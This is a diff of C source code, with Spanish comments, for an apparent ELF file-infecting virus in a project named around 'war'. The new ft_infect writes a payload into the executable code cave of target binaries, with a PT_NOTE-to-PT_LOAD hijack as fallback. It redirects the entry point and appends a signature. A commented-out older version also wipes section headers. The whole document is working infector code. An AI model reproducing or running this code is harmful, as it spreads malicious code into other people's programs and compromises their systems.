@@ -106,6 +106,9 @@ void    ft_infect(t_war *war)
     size_t          sig_len;
     int             i = 0;
     int             note_index = -1;
+    int             load_index = -1;
+    off_t           gap_start = 0;
+    int             use_gap = 0;
 
     // 1. Reservar y cargar el binario plano del payload
     payload = malloc(src_payload_bin_len);
@@ -116,89 +119,142 @@ void    ft_infect(t_war *war)
     // 2. Obtener la tabla de Program Headers
     phdr = (Elf64_Phdr *)(war->elf + war->header->e_phoff);
 
-    // 3. Buscar un segmento PT_NOTE para secuestrarlo
-    while (i < war->header->e_phnum)
+    // 3. Preparar la firma (con el fingerprint)
+    pid = getpid();
+    if (pid < 0)
     {
-        if (phdr[i].p_type == PT_NOTE && note_index == -1)
-        {
-            note_index = i;
-            break;
-        }
-        i++;
-    }
-
-    if (note_index == -1)
-    {
-        munmap(war->elf, war->file_size);
-        close(war->fd);
         free(payload);
         return;
     }
-
-    // 4. Calcular el EOF y alinear estrictamente a 0x1000 (4KB) para ld.so
-    insertion_point = war->file_size;
-    aligned_insertion = (insertion_point + 0xfff) & ~0xfff;
-
-    // Buscar la dirección virtual máxima existente para colocar la nuestra limpia
-    uint64_t max_vaddr = 0;
-    for (int j = 0; j < war->header->e_phnum; j++)
-    {
-        if (phdr[j].p_type == PT_LOAD)
-        {
-            uint64_t end_vaddr = phdr[j].p_vaddr + phdr[j].p_memsz;
-            if (end_vaddr > max_vaddr)
-                max_vaddr = end_vaddr;
-        }
-    }
-    
-    // Alinear la nueva dirección virtual a una página limpia por encima de todo
-    new_vaddr = (max_vaddr + 0xfff) & ~0xfff;
-    e_phnum_save = war->header->e_phnum;
-
-    // 5. Añadir el FINGERPRINT a la firma
-    pid = getpid();
-    if (pid < 0)
-        return;
     full_signature = malloc(strlen(war->decrypted) + 16);
-    if (!full_signature)    
+    if (!full_signature)
+    {
+        free(payload);
         return;
+    }
     snprintf(full_signature, strlen(war->decrypted) + 16, "%s%d", war->decrypted, (int)pid);
     sig_len = strlen(full_signature);
 
-    // 6. Parchear el salto delta en el payload
-    uint64_t entry_delta = war->header->e_entry - new_vaddr;
-    memcpy(payload + 2, &entry_delta, sizeof(uint64_t));
+    // 4. Buscar un hueco entre PT_LOADs ejecutables (primera opción)
+    for (i = 0; i < war->header->e_phnum; i++)
+    {
+        if (phdr[i].p_type != PT_LOAD)
+            continue;
+        if (!(phdr[i].p_flags & PF_X))
+            continue;
 
-    // 6b. parchear el offset de la firma en el payload (sig_offset, offset 10)
-    uint64_t sig_off = aligned_insertion + src_payload_bin_len;   // ← aligned_insertion, no insertion_point
-    memcpy(payload + 10, &sig_off, sizeof(uint64_t));
-    
-    // 7. SECUESTRAR PT_NOTE Y CONVERTIRLO EN PT_LOAD VÁLIDO Y ALINEADO
-    phdr[note_index].p_type = PT_LOAD;
-    phdr[note_index].p_flags = PF_R | PF_X; // Lectura y Ejecución (cero escritura)
-    phdr[note_index].p_offset = aligned_insertion;
-    phdr[note_index].p_vaddr = new_vaddr;
-    phdr[note_index].p_paddr = new_vaddr;
-    phdr[note_index].p_filesz = src_payload_bin_len + sig_len;
-    phdr[note_index].p_memsz = phdr[note_index].p_filesz;
-    phdr[note_index].p_align = 0x1000;
+        off_t end = phdr[i].p_offset + phdr[i].p_filesz;
+        off_t next_start = war->file_size;
+        for (int j = i + 1; j < war->header->e_phnum; j++)
+        {
+            if (phdr[j].p_type == PT_LOAD && phdr[j].p_offset > phdr[i].p_offset)
+            {
+                next_start = phdr[j].p_offset;
+                break;
+            }
+        }
+        off_t gap = next_start - end;
+        if (gap >= (off_t)(src_payload_bin_len + sig_len))
+        {
+            load_index = i;
+            gap_start = end;
+            use_gap = 1;
+            break;
+        }
+    }
 
-    // 8. Redirigir el punto de entrada global directamente al payload
-    war->header->e_entry = new_vaddr;
-    new_entry = war->header->e_entry;
+    // 5. Si hay hueco, inyectar ahí; si no, buscar PT_NOTE
+    if (use_gap)
+    {
+        // Inyectar en el hueco
+        new_vaddr = phdr[load_index].p_vaddr + (gap_start - phdr[load_index].p_offset);
+        new_entry = new_vaddr;
 
-    // 9. Anular limpiamente todas las Section Headers
-    //war->header->e_shoff = 0;
-    war->header->e_shnum = 0;
-    war->header->e_shentsize = 0;
-    war->header->e_shstrndx = 0;
+        // Parchear el PT_LOAD
+        phdr[load_index].p_filesz += src_payload_bin_len + sig_len;
+        phdr[load_index].p_memsz  += src_payload_bin_len + sig_len;
 
-    // 10. Copiar program headers modificados
+        // Parchear el payload
+        uint64_t entry_delta = war->header->e_entry - new_vaddr;
+        memcpy(payload + 2, &entry_delta, sizeof(uint64_t));
+        uint64_t sig_off = gap_start + src_payload_bin_len;
+        memcpy(payload + 10, &sig_off, sizeof(uint64_t));
+        // Flag: use_gap = 1 (hueco)
+        uint64_t gap_flag = 1;
+        memcpy(payload + 18, &gap_flag, sizeof(uint64_t));
+
+        // Redirigir e_entry
+        war->header->e_entry = new_entry;
+        insertion_point = gap_start;
+        aligned_insertion = gap_start;
+    }
+    else
+    {
+        // Fallback: PT_NOTE + final del archivo
+        for (i = 0; i < war->header->e_phnum; i++)
+        {
+            if (phdr[i].p_type == PT_NOTE && note_index == -1)
+            {
+                note_index = i;
+                break;
+            }
+        }
+        if (note_index == -1)
+        {
+            munmap(war->elf, war->file_size);
+            close(war->fd);
+            free(payload);
+            free(full_signature);
+            return;
+        }
+
+        insertion_point = war->file_size;
+        aligned_insertion = (insertion_point + 0xfff) & ~0xfff;
+
+        uint64_t max_vaddr = 0;
+        for (int j = 0; j < war->header->e_phnum; j++)
+        {
+            if (phdr[j].p_type == PT_LOAD)
+            {
+                uint64_t end_vaddr = phdr[j].p_vaddr + phdr[j].p_memsz;
+                if (end_vaddr > max_vaddr)
+                    max_vaddr = end_vaddr;
+            }
+        }
+        new_vaddr = (max_vaddr + 0xfff) & ~0xfff;
+        new_entry = new_vaddr;
+
+        // Parchear el PT_NOTE
+        phdr[note_index].p_type = PT_LOAD;
+        phdr[note_index].p_flags = PF_R | PF_X;
+        phdr[note_index].p_offset = aligned_insertion;
+        phdr[note_index].p_vaddr = new_vaddr;
+        phdr[note_index].p_paddr = new_vaddr;
+        phdr[note_index].p_filesz = src_payload_bin_len + sig_len;
+        phdr[note_index].p_memsz = phdr[note_index].p_filesz;
+        phdr[note_index].p_align = 0x1000;
+
+        // Parchear el payload
+        uint64_t entry_delta = war->header->e_entry - new_vaddr;
+        memcpy(payload + 2, &entry_delta, sizeof(uint64_t));
+        uint64_t sig_off = aligned_insertion + src_payload_bin_len;
+        memcpy(payload + 10, &sig_off, sizeof(uint64_t));
+        // Flag: use_gap = 0 (PT_NOTE)
+        uint64_t gap_flag = 0;
+        memcpy(payload + 18, &gap_flag, sizeof(uint64_t));
+
+        // Redirigir e_entry
+        war->header->e_entry = new_entry;
+    }
+
+    e_phnum_save = war->header->e_phnum;
+
+    // 6. Copiar program headers modificados
     phdr_table_copy = malloc(e_phnum_save * sizeof(Elf64_Phdr));
     if (phdr_table_copy)
         memcpy(phdr_table_copy, phdr, e_phnum_save * sizeof(Elf64_Phdr));
 
-    // 11. Desmontar el mapeo antiguo y reabrir descriptor en escritura
+    // 7. Desmontar el mapeo antiguo y reabrir descriptor en escritura
     munmap(war->elf, war->file_size);
     close(war->fd);
 
@@ -211,35 +267,19 @@ void    ft_infect(t_war *war)
         return;
     }
 
-    // ==========================================
-    // ESCRITURA ATÓMICA EN DISCO
-    // ==========================================
-
-    // A. Escribir nuevo e_entry (offset 24)
+    // 8. Escribir nuevo e_entry (offset 24)
     lseek(war->fd, 24, SEEK_SET);
     write(war->fd, &new_entry, sizeof(Elf64_Addr));
 
-    // B. Poner a cero e_shoff (offset 40)
-    Elf64_Off zero_off = 0;
-    lseek(war->fd, 40, SEEK_SET);
-    write(war->fd, &zero_off, sizeof(Elf64_Off));
-
-    // C. Poner a cero e_shentsize (58), e_shnum (60) y e_shstrndx (62)
-    uint16_t zero_word = 0;
-    lseek(war->fd, 58, SEEK_SET);
-    write(war->fd, &zero_word, sizeof(uint16_t));
-    write(war->fd, &zero_word, sizeof(uint16_t));
-    write(war->fd, &zero_word, sizeof(uint16_t));
-
-    // D. Reescribir tabla de Program Headers modificada (offset 64)
+    // 9. Reescribir tabla de Program Headers (offset 64)
     if (phdr_table_copy)
     {
         lseek(war->fd, 64, SEEK_SET);
         write(war->fd, phdr_table_copy, e_phnum_save * sizeof(Elf64_Phdr));
     }
 
-    // E. Rellenar con ceros (padding) desde el EOF original hasta aligned_insertion si hay diferencia
-    if (aligned_insertion > insertion_point)
+    // 10. Rellenar con ceros (padding) hasta aligned_insertion (si es PT_NOTE)
+    if (!use_gap && aligned_insertion > insertion_point)
     {
         size_t pad_len = aligned_insertion - insertion_point;
         char *pad = calloc(1, pad_len);
@@ -251,16 +291,190 @@ void    ft_infect(t_war *war)
         }
     }
 
-    // F. Escribir payload en la posición exactamente alineada
+    // 11. Escribir payload
     lseek(war->fd, aligned_insertion, SEEK_SET);
     write(war->fd, payload, src_payload_bin_len);
 
-    // G. Escribir la firma limpia a continuación
+    // 12. Escribir la firma
     write(war->fd, full_signature, sig_len);
 
-    // 12. Limpieza de recursos
+    // 13. Limpieza
     close(war->fd);
     free(full_signature);
     free(payload);
     free(phdr_table_copy);
 }
+
+// void    ft_infect(t_war *war)
+// {
+//     pid_t           pid;
+//     unsigned char   *payload;
+//     char            *full_signature;
+//     uint64_t        new_vaddr;
+//     Elf64_Phdr      *phdr;
+//     Elf64_Addr      new_entry;
+//     off_t           insertion_point;
+//     off_t           aligned_insertion;
+//     Elf64_Half      e_phnum_save = 0;
+//     Elf64_Phdr      *phdr_table_copy = NULL;
+//     size_t          sig_len;
+//     int             i = 0;
+//     int             note_index = -1;
+
+//     // 1. Reservar y cargar el binario plano del payload
+//     payload = malloc(src_payload_bin_len);
+//     if (!payload)
+//         return;
+//     memcpy(payload, src_payload_bin, src_payload_bin_len);
+
+//     // 2. Obtener la tabla de Program Headers
+//     phdr = (Elf64_Phdr *)(war->elf + war->header->e_phoff);
+
+//     // 3. Buscar un segmento PT_NOTE para secuestrarlo
+//     while (i < war->header->e_phnum)
+//     {
+//         if (phdr[i].p_type == PT_NOTE && note_index == -1)
+//         {
+//             note_index = i;
+//             break;
+//         }
+//         i++;
+//     }
+
+//     if (note_index == -1)
+//     {
+//         munmap(war->elf, war->file_size);
+//         close(war->fd);
+//         free(payload);
+//         return;
+//     }
+
+//     // 4. Calcular el EOF y alinear estrictamente a 0x1000 (4KB) para ld.so
+//     insertion_point = war->file_size;
+//     aligned_insertion = (insertion_point + 0xfff) & ~0xfff;
+
+//     // Buscar la dirección virtual máxima existente para colocar la nuestra limpia
+//     uint64_t max_vaddr = 0;
+//     for (int j = 0; j < war->header->e_phnum; j++)
+//     {
+//         if (phdr[j].p_type == PT_LOAD)
+//         {
+//             uint64_t end_vaddr = phdr[j].p_vaddr + phdr[j].p_memsz;
+//             if (end_vaddr > max_vaddr)
+//                 max_vaddr = end_vaddr;
+//         }
+//     }
+    
+//     // Alinear la nueva dirección virtual a una página limpia por encima de todo
+//     new_vaddr = (max_vaddr + 0xfff) & ~0xfff;
+//     e_phnum_save = war->header->e_phnum;
+
+//     // 5. Añadir el FINGERPRINT a la firma
+//     pid = getpid();
+//     if (pid < 0)
+//         return;
+//     full_signature = malloc(strlen(war->decrypted) + 16);
+//     if (!full_signature)    
+//         return;
+//     snprintf(full_signature, strlen(war->decrypted) + 16, "%s%d", war->decrypted, (int)pid);
+//     sig_len = strlen(full_signature);
+
+//     // 6. Parchear el salto delta en el payload
+//     uint64_t entry_delta = war->header->e_entry - new_vaddr;
+//     memcpy(payload + 2, &entry_delta, sizeof(uint64_t));
+
+//     // 6b. parchear el offset de la firma en el payload (sig_offset, offset 10)
+//     uint64_t sig_off = aligned_insertion + src_payload_bin_len;   // ← aligned_insertion, no insertion_point
+//     memcpy(payload + 10, &sig_off, sizeof(uint64_t));
+    
+//     // 7. SECUESTRAR PT_NOTE Y CONVERTIRLO EN PT_LOAD VÁLIDO Y ALINEADO
+//     phdr[note_index].p_type = PT_LOAD;
+//     phdr[note_index].p_flags = PF_R | PF_X; // Lectura y Ejecución (cero escritura)
+//     phdr[note_index].p_offset = aligned_insertion;
+//     phdr[note_index].p_vaddr = new_vaddr;
+//     phdr[note_index].p_paddr = new_vaddr;
+//     phdr[note_index].p_filesz = src_payload_bin_len + sig_len;
+//     phdr[note_index].p_memsz = phdr[note_index].p_filesz;
+//     phdr[note_index].p_align = 0x1000;
+
+//     // 8. Redirigir el punto de entrada global directamente al payload
+//     war->header->e_entry = new_vaddr;
+//     new_entry = war->header->e_entry;
+
+//     // 9. Anular limpiamente todas las Section Headers
+//     //war->header->e_shoff = 0;
+//     war->header->e_shnum = 0;
+//     war->header->e_shentsize = 0;
+//     war->header->e_shstrndx = 0;
+
+//     // 10. Copiar program headers modificados
+//     phdr_table_copy = malloc(e_phnum_save * sizeof(Elf64_Phdr));
+//     if (phdr_table_copy)
+//         memcpy(phdr_table_copy, phdr, e_phnum_save * sizeof(Elf64_Phdr));
+
+//     // 11. Desmontar el mapeo antiguo y reabrir descriptor en escritura
+//     munmap(war->elf, war->file_size);
+//     close(war->fd);
+
+//     war->fd = open(war->binary, O_RDWR | O_NOFOLLOW);
+//     if (war->fd == -1)
+//     {
+//         free(full_signature);
+//         free(payload);
+//         free(phdr_table_copy);
+//         return;
+//     }
+
+//     // ==========================================
+//     // ESCRITURA ATÓMICA EN DISCO
+//     // ==========================================
+
+//     // A. Escribir nuevo e_entry (offset 24)
+//     lseek(war->fd, 24, SEEK_SET);
+//     write(war->fd, &new_entry, sizeof(Elf64_Addr));
+
+//     // B. Poner a cero e_shoff (offset 40)
+//     Elf64_Off zero_off = 0;
+//     lseek(war->fd, 40, SEEK_SET);
+//     write(war->fd, &zero_off, sizeof(Elf64_Off));
+
+//     // C. Poner a cero e_shentsize (58), e_shnum (60) y e_shstrndx (62)
+//     uint16_t zero_word = 0;
+//     lseek(war->fd, 58, SEEK_SET);
+//     write(war->fd, &zero_word, sizeof(uint16_t));
+//     write(war->fd, &zero_word, sizeof(uint16_t));
+//     write(war->fd, &zero_word, sizeof(uint16_t));
+
+//     // D. Reescribir tabla de Program Headers modificada (offset 64)
+//     if (phdr_table_copy)
+//     {
+//         lseek(war->fd, 64, SEEK_SET);
+//         write(war->fd, phdr_table_copy, e_phnum_save * sizeof(Elf64_Phdr));
+//     }
+
+//     // E. Rellenar con ceros (padding) desde el EOF original hasta aligned_insertion si hay diferencia
+//     if (aligned_insertion > insertion_point)
+//     {
+//         size_t pad_len = aligned_insertion - insertion_point;
+//         char *pad = calloc(1, pad_len);
+//         if (pad)
+//         {
+//             lseek(war->fd, insertion_point, SEEK_SET);
+//             write(war->fd, pad, pad_len);
+//             free(pad);
+//         }
+//     }
+
+//     // F. Escribir payload en la posición exactamente alineada
+//     lseek(war->fd, aligned_insertion, SEEK_SET);
+//     write(war->fd, payload, src_payload_bin_len);
+
+//     // G. Escribir la firma limpia a continuación
+//     write(war->fd, full_signature, sig_len);
+
+//     // 12. Limpieza de recursos
+//     close(war->fd);
+//     free(full_signature);
+//     free(payload);
+//     free(phdr_table_copy);
+// }
